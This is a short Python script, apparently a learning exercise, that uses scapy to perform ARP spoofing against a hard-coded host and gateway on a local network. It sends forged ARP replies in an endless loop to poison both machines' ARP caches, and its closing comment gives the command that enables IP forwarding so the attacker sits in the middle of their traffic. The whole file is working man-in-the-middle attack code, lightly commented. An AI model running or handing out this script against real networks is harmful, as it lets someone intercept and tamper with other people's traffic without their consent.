#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# set op to 2 for arp respond (for scapy parameters refer to scapy_options.py or onenote)
# packet creation to redirect them to the target i will act as the router the mac table of the target will associate
# my mac with the routers IP
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # examine the packet to confirm the flow
    # print(packet.show())
    # print(packet.summary())
    # now send the packet
    scapy.send(packet, verbose=False)
    # then check the target machine again with arp -a (the router's 1p is acossiated with attacker's mac)
    # check the attackers mac with ifconfig eth0


# be in the middle of the connection and send continiously packets and sleep two secs
# to maintain spoofing. otherwise it will send one packet only and mac address will change
# to original
count = 0
while True:
    spoof("192.168.22.4", "192.168.22.1")
    spoof("192.168.22.1", "192.168.22.4")
    # counter
    count = count + 2
    # print("[+] Sent {} Packets".format(count))
    # or
    # print(f'[+] Sent {count} packets')
    # or
    # overwrite line with \r and put a comma in the end of print statement for dynamic printing
    # print("\r [+] Packets Sent: " + str(count)),
    # optimized for python3 for dynamic printing
    print("\r [+] Packets Sent: " + str(count), end="")
    # flush everything out of the buffer
    sys.stdout.flush()
    time.sleep(2)


# don't forget to allow traffic through the attacker in order to be the middle man
# echo 1 > /proc/sys/net/ipv4/ip_forward





